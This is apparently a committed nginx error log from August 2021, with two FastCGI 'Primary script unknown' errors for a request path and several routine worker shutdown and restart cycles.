+2021/08/12 07:40:08 [error] 22#22: *60 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 92.100.32.240, server: gate, request: "GET /iaaaa HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 07:42:05 [error] 22#22: *71 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 92.100.32.240, server: gate, request: "GET /iaaaa HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 07:44:18 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/12 07:44:18 [notice] 23#23: gracefully shutting down
+2021/08/12 07:44:18 [notice] 22#22: gracefully shutting down
+2021/08/12 07:44:18 [notice] 23#23: exiting
+2021/08/12 07:44:18 [notice] 22#22: exiting
+2021/08/12 07:44:18 [notice] 22#22: exit
+2021/08/12 07:44:18 [notice] 23#23: exit
+2021/08/12 07:44:19 [notice] 1#1: signal 17 (SIGCHLD) received from 22
+2021/08/12 07:44:19 [notice] 1#1: worker process 22 exited with code 0
+2021/08/12 07:44:19 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/12 07:44:19 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/12 07:44:19 [notice] 1#1: worker process 23 exited with code 0
+2021/08/12 07:44:19 [notice] 1#1: exit
+2021/08/12 07:46:25 [notice] 1#1: using the "epoll" event method
+2021/08/12 07:46:25 [notice] 1#1: nginx/1.21.1
+2021/08/12 07:46:25 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/12 07:46:25 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/12 07:46:25 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/12 07:46:25 [notice] 1#1: start worker processes
+2021/08/12 07:46:25 [notice] 1#1: start worker process 23
+2021/08/12 07:46:25 [notice] 1#1: start worker process 24
+2021/08/12 08:10:24 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/12 08:10:24 [notice] 24#24: gracefully shutting down
+2021/08/12 08:10:24 [notice] 24#24: exiting
+2021/08/12 08:10:24 [notice] 24#24: exit
+2021/08/12 08:10:24 [notice] 23#23: gracefully shutting down
+2021/08/12 08:10:24 [notice] 23#23: exiting
+2021/08/12 08:10:24 [notice] 23#23: exit
+2021/08/12 08:10:24 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2021/08/12 08:10:24 [notice] 1#1: worker process 24 exited with code 0
+2021/08/12 08:10:24 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/12 08:10:24 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/12 08:10:24 [notice] 1#1: worker process 23 exited with code 0
+2021/08/12 08:10:24 [notice] 1#1: exit
+2021/08/12 08:13:15 [notice] 1#1: using the "epoll" event method
+2021/08/12 08:13:15 [notice] 1#1: nginx/1.21.1
+2021/08/12 08:13:15 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/12 08:13:15 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/12 08:13:15 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/12 08:13:15 [notice] 1#1: start worker processes
+2021/08/12 08:13:15 [notice] 1#1: start worker process 22
+2021/08/12 08:13:15 [notice] 1#1: start worker process 23
+2021/08/12 11:00:32 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/12 11:00:33 [notice] 23#23: gracefully shutting down
+2021/08/12 11:00:33 [notice] 22#22: gracefully shutting down
+2021/08/12 11:00:33 [notice] 23#23: exiting
+2021/08/12 11:00:33 [notice] 23#23: exit
+2021/08/12 11:00:33 [notice] 22#22: exiting
+2021/08/12 11:00:33 [notice] 22#22: exit
+2021/08/12 11:00:33 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/12 11:00:33 [notice] 1#1: worker process 22 exited with code 0
+2021/08/12 11:00:33 [notice] 1#1: worker process 23 exited with code 0
+2021/08/12 11:00:33 [notice] 1#1: exit
+2021/08/12 11:02:17 [notice] 1#1: using the "epoll" event method
+2021/08/12 11:02:17 [notice] 1#1: nginx/1.21.1
+2021/08/12 11:02:17 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/12 11:02:17 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/12 11:02:17 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/12 11:02:17 [notice] 1#1: start worker processes
+2021/08/12 11:02:17 [notice] 1#1: start worker process 22
+2021/08/12 11:02:17 [notice] 1#1: start worker process 23
+2021/08/12 11:12:47 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/12 11:12:47 [notice] 23#23: gracefully shutting down
+2021/08/12 11:12:47 [notice] 22#22: gracefully shutting down
+2021/08/12 11:12:47 [notice] 22#22: exiting
+2021/08/12 11:12:47 [notice] 22#22: exit
+2021/08/12 11:12:47 [notice] 23#23: exiting
+2021/08/12 11:12:47 [notice] 23#23: exit
+2021/08/12 11:12:48 [notice] 1#1: signal 17 (SIGCHLD) received from 22
+2021/08/12 11:12:48 [notice] 1#1: worker process 22 exited with code 0
+2021/08/12 11:12:48 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/12 11:12:48 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/12 11:12:48 [notice] 1#1: worker process 23 exited with code 0
+2021/08/12 11:12:48 [notice] 1#1: exit
+2021/08/12 11:16:58 [notice] 1#1: using the "epoll" event method
+2021/08/12 11:16:58 [notice] 1#1: nginx/1.21.1
+2021/08/12 11:16:58 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/12 11:16:58 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/12 11:16:58 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/12 11:16:58 [notice] 1#1: start worker processes
+2021/08/12 11:16:58 [notice] 1#1: start worker process 22
+2021/08/12 11:16:58 [notice] 1#1: start worker process 23
+2021/08/12 11:22:30 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/12 11:22:30 [notice] 22#22: gracefully shutting down
+2021/08/12 11:22:30 [notice] 22#22: exiting
+2021/08/12 11:22:30 [notice] 22#22: exit
+2021/08/12 11:22:30 [notice] 23#23: gracefully shutting down
+2021/08/12 11:22:30 [notice] 23#23: exiting
+2021/08/12 11:22:30 [notice] 23#23: exit
+2021/08/12 11:22:31 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/12 11:22:31 [notice] 1#1: worker process 23 exited with code 0
+2021/08/12 11:22:31 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/12 11:22:31 [notice] 1#1: signal 17 (SIGCHLD) received from 22
+2021/08/12 11:22:31 [notice] 1#1: worker process 22 exited with code 0
+2021/08/12 11:22:31 [notice] 1#1: exit
